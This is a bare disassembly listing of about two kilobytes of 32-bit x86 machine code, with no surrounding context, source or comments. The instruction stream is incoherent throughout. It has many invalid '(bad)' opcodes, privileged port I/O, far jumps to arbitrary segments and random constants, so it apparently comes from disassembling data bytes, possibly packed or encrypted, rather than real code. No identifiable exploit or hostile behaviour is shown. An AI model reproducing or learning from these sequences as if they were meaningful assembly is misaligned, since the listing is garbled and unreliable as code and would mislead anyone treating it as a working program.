  4126b4:	addr16 inc edx
  4126b6:	fmul   QWORD PTR [ebx+0x7fc87b13]
  4126bc:	pop    edx
  4126bd:	ror    DWORD PTR [ebx],0xa5
  4126c0:	in     eax,0x7c
  4126c2:	shr    BYTE PTR [edi+0x1c2b5f9a],cl
  4126c8:	sbb    al,0xf3
  4126ca:	dec    eax
  4126cb:	xor    eax,0xf3c5185d
  4126d0:	or     eax,0xdf329664
  4126d5:	sbb    DWORD PTR [eax-0x12],ebp
  4126d8:	inc    esi
  4126d9:	fwait
  4126da:	outs   dx,DWORD PTR ds:[esi]
  4126db:	ret    0xf8c2
  4126de:	ja     0x412706
  4126e0:	popa   
  4126e1:	mov    eax,0x4c297fb0
  4126e6:	adc    DWORD PTR [ebx],esp
  4126e8:	inc    esi
  4126e9:	neg    BYTE PTR [ebx+ebp*2+0x63]
  4126ed:	and    al,0xa6
  4126ef:	ins    BYTE PTR es:[edi],dx
  4126f0:	xor    BYTE PTR [edx-0x14c8b7b3],0xd1
  4126f7:	sbb    DWORD PTR [ecx],edi
  4126f9:	jmp    0x8352:0x5c4efe86
  412700:	out    dx,al
  412701:	repnz arpl dx,bx
  412704:	xlat   BYTE PTR ds:[ebx]
  412705:	rol    DWORD PTR [edi-0x7b],cl
  412708:	ja     0x412704
  41270a:	inc    edi
  41270b:	or     al,0x22
  41270d:	and    ch,0xf1
  412710:	clc    
  412711:	xchg   DWORD PTR [edx-0x145c5564],edx
  412717:	xchg   DWORD PTR [ebx],edi
  412719:	pop    ds
  41271a:	inc    ebx
  41271b:	ror    edi,1
  41271d:	(bad)  
  41271e:	std    
  41271f:	neg    BYTE PTR [edx+0x2e]
  412722:	push   esp
  412723:	jae    0x412711
  412725:	add    al,0x5b
  412727:	pop    edi
  412728:	cs cwde 
  41272a:	push   es
  41272b:	sub    DWORD PTR [ebx],esi
  41272d:	out    dx,eax
  41272e:	rol    al,0xa
  412731:	imul   DWORD PTR [ebp+0x75]
  412734:	cmp    bh,BYTE PTR [edi]
  412736:	into   
  412737:	fisubr WORD PTR [ecx+edx*8+0x51]
  41273b:	dec    edi
  41273c:	mov    al,0x7e
  41273e:	ret    0xe641
  412741:	data16 mov dl,0x65
  412744:	mov    bh,0x6b
  412746:	xor    BYTE PTR [esi],dl
  412748:	mov    eax,ds:0x79db7ad6
  41274d:	inc    edi
  41274e:	mov    ebp,0x4eea85c1
  412753:	mov    ah,0x43
  412755:	sub    eax,ebx
  412757:	cmc    
  412758:	seto   BYTE PTR [eax]
  41275b:	out    dx,al
  41275c:	js     0x412702
  41275e:	pop    ss
  41275f:	call   0x1330:0xb68c48bc
  412766:	adc    ecx,DWORD PTR [ebx+0x1dc084d]
  41276c:	das    
  41276d:	cmp    esi,0xf9cf286d
  412773:	hlt    
  412774:	packssdw mm7,mm6
  412777:	je     0x41274a
  412779:	xchg   ecx,eax
  41277a:	bound  eax,QWORD PTR [eax+0x295607ac]
  412780:	pop    edi
  412781:	mov    DWORD PTR [esi],ebx
  412783:	ds loope 0x412775
  412786:	mov    ah,0x7c
  412788:	data16 and al,0x17
  41278b:	mov    BYTE PTR [ecx-0x61aaafe],bl
  412791:	cwde   
  412792:	mov    ebx,0x5c805780
  412797:	mov    eax,ds:0xe32dc2b8
  41279c:	inc    ecx
  41279d:	fsub   DWORD PTR ds:0x8dc18dcd
  4127a3:	das    
  4127a4:	ds pop esi
  4127a6:	les    ebp,FWORD PTR [ecx-0x70]
  4127a9:	ror    BYTE PTR gs:[edx],cl
  4127ac:	mov    edi,0xa93ca9fb
  4127b1:	cmp    edx,DWORD PTR [esi]
  4127b3:	push   ss
  4127b4:	repnz std 
  4127b6:	fisttp QWORD PTR [ebp-0x20]
  4127b9:	mov    edi,0x8aaa4d9e
  4127be:	and    edx,DWORD PTR [edi+0x63]
  4127c1:	iret   
  4127c2:	daa    
  4127c3:	and    cl,ah
  4127c5:	(bad)  
  4127c6:	pop    ebx
  4127c7:	call   0x5161610f
  4127cc:	ins    DWORD PTR es:[edi],dx
  4127cd:	and    dh,bl
  4127cf:	not    edi
  4127d1:	mov    gs,WORD PTR [ecx+0x73]
  4127d4:	ins    BYTE PTR es:[edi],dx
  4127d5:	inc    edi
  4127d6:	jnp    0x41280e
  4127d8:	repz xchg edx,eax
  4127da:	aam    0x72
  4127dc:	popa   
  4127dd:	imul   ecx,DWORD PTR [edx],0x3e
  4127e0:	add    al,0x9f
  4127e2:	fcomi  st,st(0)
  4127e4:	cdq    
  4127e5:	sub    eax,0x98f9ff19
  4127ea:	mov    eax,0xa9848acb
  4127ef:	repz cmp BYTE PTR cs:[esi],bh
  4127f3:	hlt    
  4127f4:	mov    ch,0xe4
  4127f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127f7:	mov    WORD PTR [eax+0x419806b7],cs
  4127fd:	shl    DWORD PTR [ebx+0x3f],1
  412800:	in     al,dx
  412801:	test   al,0x3a
  412803:	jo     0x412852
  412805:	lods   al,BYTE PTR ds:[esi]
  412806:	mov    dh,0x34
  412808:	cmp    DWORD PTR [ebx+eax*8-0xf],ecx
  41280c:	and    bl,bh
  41280e:	mov    ds:0x5f521cfc,al
  412813:	mov    bh,0x71
  412815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412816:	mov    ds,esp
  412818:	mov    DWORD PTR [edx+0x4925039a],edi
  41281e:	or     cl,BYTE PTR [esi]
  412820:	stos   BYTE PTR es:[edi],al
  412821:	mov    BYTE PTR [ecx+eiz*2+0x4d],al
  412825:	clc    
  412826:	xchg   ebx,eax
  412827:	stc    
  412828:	das    
  412829:	pop    esi
  41282a:	mov    edx,DWORD PTR [eax]
  41282c:	adc    ebx,eax
  41282e:	cmc    
  41282f:	fnsave [edi]
  412831:	push   DWORD PTR [ecx-0x580e5316]
  412837:	mov    bl,0xb2
  412839:	dec    esp
  41283a:	mov    edi,0x83891101
  41283f:	inc    ebp
  412840:	and    BYTE PTR [eax-0x5ca41ecf],ch
  412846:	xor    DWORD PTR [ebx+edi*2-0x58],esp
  41284a:	add    BYTE PTR [eax+ebp*1],al
  41284d:	loop   0x4127f4
  41284f:	sub    BYTE PTR [ebp+ebx*2+0x232a69b1],ah
  412856:	mov    ch,0x4b
  412858:	mov    bh,0x3
  41285a:	mov    bl,0xef
  41285c:	mov    ds:0x1da778b4,eax
  412861:	mov    ebx,0xefae47c3
  412866:	daa    
  412867:	cmp    dh,ah
  412869:	imul   ecx,edi,0x2789f83d
  41286f:	out    dx,al
  412870:	and    DWORD PTR [edi-0x363e34df],esp
  412876:	pop    esi
  412877:	rcl    DWORD PTR [ebp+0x4f57285],1
  41287d:	(bad)  
  41287e:	ror    dl,1
  412880:	add    ebp,DWORD PTR [edx+0x1a]
  412883:	push   ecx
  412884:	mov    ds:0x286e1011,al
  412889:	(bad)
  41288c:	dec    esp
  41288d:	xor    BYTE PTR [ebp-0x19c289c3],bl
  412893:	out    0xee,al
  412895:	adc    al,0xd2
  412897:	dec    edx
  412898:	sbb    DWORD PTR [edx+0x764ebff7],edi
  41289e:	fist   WORD PTR [esi-0x5a12de84]
  4128a4:	out    0x51,al
  4128a6:	xor    DWORD PTR [ebp+0xe1407c4],0x1e
  4128ad:	pop    ebx
  4128ae:	jle    0x4128f0
  4128b0:	iret   
  4128b1:	lds    edi,FWORD PTR [edi+esi*1]
  4128b4:	adc    eax,0x3be62adc
  4128b9:	mov    WORD PTR ds:[ebx+eax*8],cs
  4128bd:	test   BYTE PTR [edx+ecx*2],0xd2
  4128c1:	adc    esp,0x39b638e7
  4128c7:	mov    eax,ds:0xddfd07ad
  4128cc:	pop    esp
  4128cd:	adc    ch,BYTE PTR [ebp+0x57]
  4128d0:	mov    bh,0x23
  4128d2:	push   ds
  4128d3:	or     BYTE PTR [ebp-0x4f],bl
  4128d6:	out    dx,eax
  4128d7:	out    0x2,eax
  4128d9:	mov    al,ds:0xe60e9425
  4128de:	adc    al,0x73
  4128e0:	iret   
  4128e1:	mov    cs,esp
  4128e3:	mov    eax,ds:0x839c8b38
  4128e8:	mov    eax,ds:0x50615c23
  4128ed:	out    dx,eax
  4128ee:	(bad)  
  4128ef:	(bad)
  4128f2:	arpl   WORD PTR [ebp+ebp*2+0x4aec4d62],dx
  4128f9:	add    al,BYTE PTR [ebx]
  4128fb:	loope  0x4128fa
  4128fd:	sub    DWORD PTR [edi],esp
  4128ff:	dec    esi
  412900:	mov    al,0xf4
  412902:	sbb    BYTE PTR [ebp+0x644e282d],dl
  412908:	ss push edx
  41290a:	or     DWORD PTR [edx],eax
  41290c:	lods   eax,DWORD PTR ds:[esi]
  41290d:	mov    al,ds:0xa8d08335
  412912:	cmp    edi,DWORD PTR [eax]
  412914:	mov    esp,0x441269bd
  412919:	xchg   ebx,eax
  41291a:	imul   ecx,edi,0x8
  41291d:	push   cs
  41291e:	aad    0x7c
  412920:	gs in  eax,0xaa
  412923:	mov    dl,0xb7
  412925:	dec    ebx
  412926:	ja     0x41296f
  412928:	add    DWORD PTR [edx],ebp
  41292a:	pop    edx
  41292b:	in     al,0x41
  41292d:	inc    edx
  41292e:	sub    DWORD PTR ds:0x66a94663,edi
  412934:	ins    DWORD PTR es:[edi],dx
  412935:	iret   
  412936:	mov    eax,DWORD PTR [edx+0x5d3a7d11]
  41293c:	add    cl,BYTE PTR [eax+eax*8+0x3d]
  412940:	js     0x412958
  412942:	dec    edx
  412943:	adc    eax,0x7f0a40c6
  412948:	in     al,0xd5
  41294a:	push   esi
  41294b:	mov    ecx,0x8d437f4e
  412950:	adc    al,0xc
  412952:	out    0x58,eax
  412954:	fdivr  DWORD PTR [ebp+ecx*8+0x3dd26e0]
  41295b:	sub    al,0x14
  41295d:	fisubr WORD PTR [esi-0x2c]
  412960:	or     al,0x7
  412962:	adc    esi,DWORD PTR [esp+edx*1-0x600c02e5]
  412969:	ret    0xf385
  41296c:	pop    ecx
  41296d:	sahf   
  41296e:	jmp    0x1907:0xac67a20a
  412975:	outs   dx,DWORD PTR ds:[esi]
  412976:	ds int 0xe3
  412979:	sbb    DWORD PTR [ecx+0x5a98fd95],eax
  41297f:	adc    al,0xa1
  412981:	mov    dl,0xf6
  412983:	out    0xd0,eax
  412985:	das    
  412986:	inc    ebx
  412987:	add    edx,DWORD PTR [ebx]
  412989:	loope  0x4129b8
  41298b:	xor    al,0xb3
  41298d:	aas    
  41298e:	pop    edx
  41298f:	mov    eax,ds:0x8ec9f9d2
  412994:	sbb    al,bl
  412996:	xchg   DWORD PTR [eax],ebx
  412998:	cmp    al,0x9b
  41299a:	sbb    ah,dl
  41299c:	mov    gs,WORD PTR [edi]
  41299e:	xchg   edi,eax
  41299f:	pop    es
  4129a0:	gs jge 0x41298f
  4129a3:	sbb    esp,ebx
  4129a5:	hlt    
  4129a6:	lahf   
  4129a7:	pushf  
  4129a8:	cli    
  4129a9:	sar    DWORD PTR ds:0x4e250c67,0x56
  4129b0:	jge    0x4129b8
  4129b2:	dec    esp
  4129b3:	mov    bh,0x7a
  4129b5:	fxam   
  4129b7:	sub    BYTE PTR [edx+edi*2-0x50],al
  4129bb:	pop    es
  4129bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129bd:	jge    0x412a13
  4129bf:	loop   0x4129fe
  4129c1:	jo     0x412a1f
  4129c3:	mov    eax,ds:0x500e7973
  4129c8:	add    ch,0xd7
  4129cb:	or     DWORD PTR [edx],ebx
  4129cd:	dec    ebx
  4129ce:	out    dx,al
  4129cf:	ja     0x41296e
  4129d1:	jecxz  0x412998
  4129d3:	sub    al,0xf9
  4129d5:	pop    eax
  4129d6:	fucomp st(1)
  4129d8:	sbb    dh,BYTE PTR [edx-0x66f10f88]
  4129de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129df:	in     eax,dx
  4129e0:	xchg   DWORD PTR [esi],ecx
  4129e2:	in     eax,dx
  4129e3:	stos   BYTE PTR es:[edi],al
  4129e4:	paddb  mm7,QWORD PTR [ebx-0x2f]
  4129e8:	mov    ecx,0xfd180f05
  4129ed:	out    0x44,al
  4129ef:	loop   0x4129ca
  4129f1:	shl    DWORD PTR [ecx-0x7d],cl
  4129f4:	mov    ds:0x14c26a3,al
  4129f9:	out    0x32,al
  4129fb:	test   eax,0x4735829f
  412a00:	arpl   bx,di
  412a02:	fxch   st(1)
  412a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a05:	push   edx
  412a06:	jg     0x412a32
  412a08:	mov    ebp,0xac1bf3b9
  412a0d:	ja     0x4129e4
  412a0f:	ss or  al,0xa4
  412a12:	cmp    ah,BYTE PTR [esi]
  412a14:	daa    
  412a15:	mov    bl,0x3c
  412a17:	jae    0x412a85
  412a19:	call   0x4027:0xd2b0e777
  412a20:	repnz dec ebp
  412a22:	aas    
  412a23:	and    ebx,DWORD PTR [ebp+esi*8-0x65d0dfc1]
  412a2a:	push   ecx
  412a2b:	je     0x412a80
  412a2d:	add    dh,dh
  412a2f:	ja     0x412a85
  412a31:	(bad)  
  412a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a33:	enter  0x5d5e,0xf8
  412a37:	icebp  
  412a38:	xchg   edx,eax
  412a39:	cld    
  412a3a:	fist   DWORD PTR [esi]
  412a3c:	out    0x92,eax
  412a3e:	jbe    0x412a18
  412a40:	(bad)  
  412a41:	fisttp QWORD PTR [edx+0x7699969a]
  412a47:	mov    ecx,0x39bbd5cc
  412a4c:	ret    
  412a4d:	pop    edx
  412a4e:	ins    BYTE PTR es:[edi],dx
  412a4f:	in     al,dx
  412a50:	or     ah,BYTE PTR [ebp-0x66aa71cd]
  412a56:	jmp    0x36b66da5
  412a5b:	pushf  
  412a5c:	clc    
  412a5d:	ss inc ecx
  412a5f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  412a61:	fwait
  412a62:	push   ebx
  412a63:	dec    eax
  412a64:	mov    eax,ds:0xc8c9994f
  412a69:	add    eax,ebp
  412a6b:	cld    
  412a6c:	mov    dl,0xfd
  412a6e:	or     bh,dh
  412a70:	pop    ss
  412a71:	jno    0x412ab4
  412a73:	dec    eax
  412a74:	fxch   st(6)
  412a76:	cwde   
  412a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a78:	inc    ebp
  412a79:	add    DWORD PTR ds:0x31c2dd23,edi
  412a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a80:	and    al,0x9e
  412a82:	into   
  412a83:	sub    al,0xfb
  412a85:	mov    ds:0x1f845265,eax
  412a8a:	fdivp  st(2),st
  412a8c:	sub    DWORD PTR [eax],ebp
  412a8e:	sti    
  412a8f:	dec    esi
  412a90:	mov    esi,0x5c5d6244
  412a95:	mov    ah,0xca
  412a97:	add    DWORD PTR [edx+0x12832382],ebp
  412a9d:	sbb    DWORD PTR [ebx+eiz*8-0x56],ebp
  412aa1:	mov    bl,0xc3
  412aa3:	ds push esi
  412aa5:	sti    
  412aa6:	mov    esp,0xd6eafd86
  412aab:	fucompp 
  412aad:	cmp    eax,0xf4ef3a2c
  412ab2:	arpl   ax,sp
  412ab4:	mov    edx,DWORD PTR [eax]
  412ab6:	push   eax
  412ab7:	scas   eax,DWORD PTR es:[edi]
  412ab8:	cli    
  412ab9:	mov    eax,0x928db33d
  412abe:	(bad)
  412ac2:	mov    ds:0xc0c950e1,al
  412ac7:	inc    ecx
  412ac8:	push   0xffffffc3
  412aca:	in     eax,0x51
  412acc:	mov    ds:0x52d36ed2,al
  412ad1:	inc    ecx
  412ad2:	dec    esi
  412ad3:	push   0x2d
  412ad5:	add    eax,0xa6f1b2a4
  412ada:	or     eax,0x92b167d4
  412adf:	std    
  412ae0:	aad    0x4f
  412ae2:	jne    0x412ab6
  412ae4:	sbb    al,0x3e
  412ae6:	jnp    0x412b41
  412ae8:	mov    DWORD PTR [eiz*4+0x7ee34584],ecx
  412aef:	xchg   BYTE PTR [edx-0x78],al
  412af2:	or     eax,DWORD PTR [ebp+ebp*2+0x66]
  412af6:	or     bh,bh
  412af8:	xor    al,ah
  412afa:	psrlq  mm1,mm2
  412afd:	mov    esi,0x410308e
  412b02:	mov    esi,0x5f7f4ee1
  412b07:	pop    esp
  412b08:	int3   
  412b09:	ret    0xc482
  412b0c:	lods   eax,DWORD PTR ds:[esi]
  412b0d:	in     al,dx
  412b0e:	call   0x5d905255
  412b13:	jge    0x412aea
  412b15:	mov    ebx,0x291623f7
  412b1a:	pop    ss
  412b1b:	mov    ebx,0x168c0406
  412b20:	push   cs
  412b21:	push   ds
  412b22:	bound  eax,QWORD PTR [edx-0x65ad7d73]
  412b28:	repz inc eax
  412b2a:	popa   
  412b2b:	popw   es
  412b2d:	ret    
  412b2e:	aad    0x8
  412b30:	cmp    al,BYTE PTR [ecx]
  412b32:	push   es
  412b33:	icebp  
  412b34:	pusha  
  412b35:	iret   
  412b36:	or     cl,BYTE PTR es:[edi+ecx*2]
  412b3a:	pop    ds
  412b3b:	sar    BYTE PTR [ecx-0x65],cl
  412b3e:	jl     0x412b36
  412b40:	jae    0x412b9e
  412b42:	xor    BYTE PTR [eax-0x7d],cl
  412b45:	mov    ecx,0x40de9a1f
  412b4a:	jne    0x412b85
  412b4c:	mov    bh,0x88
  412b4e:	jbe    0x412b0b
  412b50:	dec    DWORD PTR ds:0x3045e66c
  412b56:	retf   0xb844
  412b59:	xlat   BYTE PTR ds:[ebx]
  412b5a:	dec    ebp
  412b5b:	xor    al,0x84
  412b5d:	jo     0x412b7a
  412b5f:	cmp    eax,0xa59ec6ef
  412b64:	int    0xaf
  412b66:	inc    ecx
  412b67:	inc    ebx
  412b68:	dec    ebp
  412b69:	add    BYTE PTR [edx-0x67],0x55
  412b6d:	rcr    DWORD PTR [ecx+0x6],1
  412b70:	or     ch,ah
  412b72:	mov    ds:0x24e7617d,al
  412b77:	and    eax,0x86ef8f58
  412b7c:	scas   eax,DWORD PTR es:[edi]
  412b7d:	(bad)  
  412b7e:	daa    
  412b7f:	push   ecx
  412b80:	sti    
  412b81:	ror    BYTE PTR [edi-0x762e1b23],0xd6
  412b88:	mov    dl,0x4d
  412b8a:	xor    edx,DWORD PTR [esi+ebp*2-0x460d5553]
  412b91:	or     eax,esp
  412b93:	mov    ds,WORD PTR [ecx+edx*2]
  412b96:	test   DWORD PTR [eax+0x209ddabc],esi
  412b9c:	test   eax,0xa42849e2
  412ba1:	pop    edx
  412ba2:	ja     0x412b3e
  412ba4:	add    bl,dl
  412ba6:	dec    ebp
  412ba7:	xchg   BYTE PTR [eax+0x14],ch
  412baa:	jp     0x412bbd
  412bac:	jl     0x412ba9
  412bae:	xchg   esp,eax
  412baf:	mov    bl,0xa7
  412bb1:	pop    ebx
  412bb2:	push   esi
  412bb3:	pop    es
  412bb4:	cli    
  412bb5:	shr    DWORD PTR [edi+0x2f],1
  412bb8:	js     0x412b81
  412bba:	sbb    BYTE PTR [edx+0x61],0x6d
  412bbe:	sub    ebp,DWORD PTR [ebp+0x71643b9a]
  412bc4:	arpl   WORD PTR [edi],si
  412bc6:	fucomip st,st(1)
  412bc8:	sar    BYTE PTR [ebp+0x37e4fdd1],1
  412bce:	das    
  412bcf:	nop
  412bd0:	aaa    
  412bd1:	fcomp  QWORD PTR [edi+0x30]
  412bd4:	cmp    BYTE PTR [edi],dl
  412bd6:	or     al,BYTE PTR fs:[edx]
  412bd9:	xor    DWORD PTR [edi-0x27],esi
  412bdc:	(bad)  
  412bdd:	rol    BYTE PTR [ecx-0x5f4c059a],1
  412be3:	aas    
  412be4:	shl    DWORD PTR [ebx+0x3a040ce1],cl
  412bea:	std    
  412beb:	mov    bl,0x8a
  412bed:	ins    DWORD PTR es:[edi],dx
  412bee:	xchg   DWORD PTR [esp+edi*4-0x17],esp
  412bf2:	ins    DWORD PTR es:[edi],dx
  412bf3:	mov    eax,ds:0x4ec05aec
  412bf8:	jg     0x412c08
  412bfa:	mov    ebp,0x216d2166
  412bff:	scas   ax,WORD PTR es:[edi]
  412c01:	mov    bl,0xad
  412c03:	jmp    0xfa56c5ef
  412c08:	stc    
  412c09:	retf   0xf7c7
  412c0c:	push   ebx
  412c0d:	sub    BYTE PTR [edi-0x7348c29e],dl
  412c13:	push   cs
  412c14:	inc    ecx
  412c15:	pushf  
  412c16:	xor    ah,BYTE PTR [eax]
  412c18:	jbe    0x412bfa
  412c1a:	xchg   esp,eax
  412c1b:	repnz dec esp
  412c1d:	or     dl,BYTE PTR [ebx+esi*4]
  412c20:	add    al,0x4
  412c22:	mov    ds:0xd6cda164,eax
  412c27:	adc    eax,0xfe6adff7
  412c2c:	loope  0x412c99
  412c2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c2f:	cdq    
  412c30:	mov    ecx,0x5eabeaf4
  412c35:	dec    ebp
  412c36:	mov    ah,0x13
  412c38:	mov    al,ds:0xc76a44c0
  412c3d:	xlat   BYTE PTR ds:[ebx]
  412c3e:	icebp  
  412c3f:	leave  
  412c40:	hlt    
  412c41:	inc    ecx
  412c42:	(bad)  
  412c43:	or     DWORD PTR [edi+ebx*8-0xf],eax
  412c47:	dec    edi
  412c48:	(bad)  
  412c4a:	cmp    bh,dl
  412c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c4d:	mov    bh,0xbb
  412c4f:	(bad)  
  412c50:	adc    DWORD PTR [edi],edi
  412c52:	jp     0x412c8c
  412c54:	cmp    BYTE PTR [ecx-0x4a],bh
  412c57:	in     eax,0x95
  412c59:	sbb    al,0xab
  412c5b:	dec    ebx
  412c5c:	test   bl,0x98
  412c5f:	xchg   esp,eax
  412c60:	adc    DWORD PTR [ebx-0x56fc5d7f],ebx
  412c66:	clc    
  412c67:	mov    ds:0x7c86263,al
  412c6c:	je     0x412cda
  412c6e:	mov    esp,DWORD PTR [edx+eiz*4]
  412c71:	xor    cl,BYTE PTR [eax+0xfdbee67]
  412c77:	mov    esp,0xe3bfc43f
  412c7c:	push   ecx
  412c7d:	lahf   
  412c7e:	push   ebp
  412c7f:	neg    ecx
  412c81:	adc    BYTE PTR [edx+0x644a9c57],al
  412c87:	je     0x412cd4
  412c89:	rcl    DWORD PTR [eax+ebp*2+0x46],1
  412c8d:	inc    esi
  412c8e:	or     ah,al
  412c90:	in     eax,0x45
  412c92:	sub    esp,DWORD PTR [esi+0x61]
	...
  412d11:	add    BYTE PTR [eax],al
  412d13:	add    ah,dl
  412d15:	(bad)  
  412d16:	in     eax,dx
  412d17:	jp     0x412d08
  412d19:	jp     0x412cf2
  412d1b:	(bad)  
  412d1c:	jnp    0x412d5a
  412d1e:	adc    ecx,DWORD PTR [esi+0x6c]
  412d21:	aaa    
  412d22:	fisttp WORD PTR fs:[eax-0x2b]
  412d26:	add    BYTE PTR [eax],al
  412d28:	imul   eax,DWORD PTR [edi],0x2f5e0000
  412d2e:	test   BYTE PTR ds:0xfb3a6a6b,0x3e
  412d35:	mov    edi,0x978cce1
  412d3a:	imul   eax,DWORD PTR [eax+eiz*8+0x34595f97],0xc94a114f
  412d45:	mov    ds:0xb4f8d26e,eax
  412d4a:	scas   eax,DWORD PTR es:[edi]
  412d4b:	sbb    al,0x56
  412d4d:	and    BYTE PTR [ebx],0xf0
  412d50:	loop   0x412d51
  412d52:	les    ebx,FWORD PTR [esi-0x71]
  412d55:	ss xchg edi,eax
  412d57:	std    
  412d58:	pop    ss
  412d59:	(bad)  
  412d5a:	jmp    ebp
  412d5c:	jle    0x412d86
  412d5e:	retf   0x39c8
  412d61:	mov    ds:0x6069e84d,eax
  412d66:	daa    
  412d67:	mov    ds:0x479c421,al
  412d6c:	push   esp
  412d6d:	jmp    0x704d:0xd6cc58e2
  412d74:	popf   
  412d75:	stos   BYTE PTR es:[edi],al
  412d76:	dec    ebp
  412d77:	adc    DWORD PTR ds:0xaaa1cdd8,edi
  412d7d:	mov    eax,0xfcc7351b
  412d82:	test   DWORD PTR [ebp+0x76],ebp
  412d85:	inc    esp
  412d86:	cdq    
  412d87:	or     esp,DWORD PTR [edx+edi*1-0x221fbadc]
  412d8e:	jmp    0xec979127
  412d93:	loopne 0x412dfd
  412d95:	sbb    DWORD PTR [eax+eax*1-0x25],edi
  412d99:	outs   dx,DWORD PTR ds:[esi]
  412d9a:	mov    bl,0xb1
  412d9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d9d:	cmp    BYTE PTR [eax+eiz*8],bl
  412da0:	mov    al,ds:0x90264fd3
  412da5:	and    eax,ecx
  412da7:	outs   dx,DWORD PTR ds:[esi]
  412da8:	lods   al,BYTE PTR ds:[esi]
  412da9:	jle    0x412dd1
  412dab:	stos   DWORD PTR es:[edi],eax
  412dac:	push   ds
  412dad:	jo     0x412d31
  412daf:	add    dl,0x92
  412db2:	push   0x3a
  412db4:	ja     0x412df3
  412db6:	mov    ebx,0xaf8e38ac
  412dbb:	push   ds
  412dbc:	cli    
  412dbd:	sbb    bh,BYTE PTR [edx]
  412dbf:	jns    0x412e19
  412dc1:	aas    
  412dc2:	shr    BYTE PTR [ecx-0x46],0xcb
  412dc6:	inc    eax
  412dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dc8:	int    0x8d
  412dca:	sub    DWORD PTR [edx+eiz*4+0x42ba4dce],0x9504f9ea
  412dd5:	mov    esp,DWORD PTR [ecx+0x6c]
  412dd8:	rol    DWORD PTR [eax],cl
  412dda:	and    al,0xaf
  412ddc:	enter  0x605e,0xc1
  412de0:	mov    ch,0x26
  412de2:	aad    0x4c
  412de4:	repnz stos BYTE PTR es:[edi],al
  412de6:	daa    
  412de7:	psubw  mm3,QWORD PTR [eax+ebp*4+0x5724692b]
  412def:	jae    0x412e67
  412df1:	inc    ebx
  412df2:	cmp    al,0xd5
  412df4:	(bad)  
  412df5:	adc    BYTE PTR [ebx+0x37],al
  412df8:	sub    al,0xe3
  412dfa:	mov    esp,ds
  412dfc:	aas    
  412dfd:	add    eax,0x7ea2b1ae
  412e02:	jae    0x412dd5
  412e04:	call   0xc7eb:0x261f7f7a
  412e0b:	push   ecx
  412e0c:	lds    esi,FWORD PTR [ecx]
  412e0e:	lds    eax,FWORD PTR [edx]
  412e10:	pushf  
  412e11:	xor    DWORD PTR [ecx],eax
  412e13:	mov    esp,0x81a77f35
  412e18:	shl    bl,cl
  412e1a:	mov    dh,0x2c
  412e1c:	imul   ebp,DWORD PTR [eax+0x7298b5e6],0x22
  412e23:	into   
  412e24:	aas    
  412e25:	and    BYTE PTR [ecx],cl
  412e27:	in     eax,dx
  412e28:	inc    ebp
  412e29:	push   es
  412e2a:	add    BYTE PTR [esi+0x3b],ch
  412e2d:	imul   esp,ebp,0x284ae8c0
  412e33:	xor    al,0x2e
  412e35:	das    
  412e36:	mov    al,0xac
  412e38:	fs dec edi
  412e3a:	imul   eax,ecx,0x8624e891
  412e40:	dec    edx
  412e41:	or     ecx,esp
  412e43:	xchg   ebp,eax
  412e44:	mov    bl,0x3c
  412e46:	scas   eax,DWORD PTR es:[edi]
  412e47:	push   cs
  412e48:	jmp    0x412e55
  412e4a:	xor    eax,0x3117a04b
  412e4f:	out    0xb5,eax
  412e51:	sub    al,0x59
  412e53:	inc    esi
  412e54:	sub    dl,BYTE PTR [eax+0x79]
  412e57:	fwait
  412e58:	pop    ss
  412e59:	pop    ss
  412e5a:	sub    BYTE PTR [ecx],dl
  412e5c:	cdq    
  412e5d:	retf   0xb5c1
  412e60:	retf   
  412e61:	sub    eax,0x99d644d2
  412e66:	mov    ah,0x7f
  412e68:	push   cs
  412e69:	ret    
  412e6a:	pop    eax
  412e6b:	test   DWORD PTR [eax-0x47],ecx
  412e6e:	sar    edi,cl
  412e70:	hlt    
  412e71:	add    bh,ch
  412e73:	aad    0x4d
  412e75:	jne    0x412e37
  412e77:	in     al,dx
  412e78:	(bad)  
  412e79:	mov    ecx,0x500b765a
  412e7e:	inc    edi
  412e7f:	jbe    0x412ebd
  412e81:	out    0x86,al
  412e83:	aad    0x4d
  412e85:	push   eax
  412e86:	aaa    
  412e87:	fs push edx
  412e89:	jmp    0x412e3d
  412e8b:	jae    0x412e13
  412e8d:	xor    BYTE PTR ds:0x32b8177a,ah
  412e93:	xchg   esi,eax
  412e94:	iret   
  412e95:	xchg   edx,eax
  412e96:	iret   
  412e97:	retf   0xff5d
  412e9a:	hlt    
  412e9b:	shl    ah,0x4b
  412e9e:	imul   edx,DWORD PTR [esi+0x26f78891],0xbfb42e48
  412ea8:	push   edx
  412ea9:	xchg   BYTE PTR [edi+0x31],dh
  412eac:	jge    0x412e45
  412eae:	das    
  412eaf:	fsub   st(5),st
  412eb1:	xor    BYTE PTR [eax],bh
  412eb3:	or     eax,0xe236edbc
  412eb8:	mov    ds:0x166ab670,al
  412ebd:	adc    eax,0x7d877aeb
  412ec2:	retf   
  412ec3:	js     0x412e8f
  412ec5:	stc    
  412ec6:	adc    dl,BYTE PTR [edi]
  412ec8:	jae    0x412e94
  412eca:	mov    bh,0xed
  412ecc:	pop    esp
  412ecd:	jl     0x412f0d
  412ecf:	ja     0x412ed6
  412ed1:	lods   eax,DWORD PTR ds:[esi]
  412ed2:	push   es
  412ed3:	jmp    0xf27d3838
  412ed8:	(bad)  
  412ed9:	xor    DWORD PTR [ebp+0x45],esi
  412edc:	lods   eax,DWORD PTR ds:[esi]
  412edd:	mov    cl,bh
  412edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ee0:	loop   0x412e79
  412ee2:	sbb    eax,0x242b6233
  412ee7:	pop    ecx
  412ee8:	stos   DWORD PTR es:[edi],eax
  412ee9:	xor    al,0x55
  412eeb:	das    
  412eec:	into   
  412eed:	pop    ebp
